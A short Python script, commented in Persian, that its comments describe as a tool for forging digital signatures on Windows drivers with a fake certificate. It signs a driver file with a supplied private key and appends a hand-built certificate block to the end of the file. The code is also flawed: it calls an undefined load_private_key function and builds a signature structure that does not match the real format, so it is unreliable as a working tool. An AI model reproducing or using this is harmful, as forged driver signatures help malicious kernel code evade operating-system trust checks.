#!/usr/bin/env python3
# ابزار جعل امضای دیجیتال برای درایورها

import hashlib
import struct
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend

def sign_driver(driver_path, cert_path, key_path):
    """امضای درایور با گواهی جعلی"""
    # خواندن درایور
    with open(driver_path, 'rb') as f:
        driver_data = f.read()
    
    # ایجاد امضای جعلی
    signature = create_fake_signature(driver_data, key_path)
    
    # افزودن امضا به درایور
    signed_driver = add_signature_to_driver(driver_data, signature, cert_path)
    
    # ذخیره درایور امضا شده
    with open(driver_path + '.signed', 'wb') as f:
        f.write(signed_driver)

def create_fake_signature(data, key_path):
    """ایجاد امضای دیجیتال جعلی"""
    # خواندن کلید خصوصی
    with open(key_path, 'rb') as f:
        private_key = load_private_key(f.read())
    
    # ایجاد امضا
    signature = private_key.sign(
        data,
        padding.PKCS1v15(),
        hashes.SHA256()
    )
    return signature

def add_signature_to_driver(data, signature, cert_path):
    """افزودن امضا و گواهی به درایور"""
    # خواندن گواهی
    with open(cert_path, 'rb') as f:
        cert_data = f.read()
    
    # ساخت ساختار امضا
    sig_header = struct.pack('<I', 0x00020200)  # WIN_CERT_TYPE_PKCS_SIGNED_DATA
    sig_size = len(signature) + len(cert_data) + 8
    sig_data = struct.pack('<II', sig_size, 0) + signature + cert_data
    
    # افزودن به انتهای درایور
    return data + sig_header + sig_data
    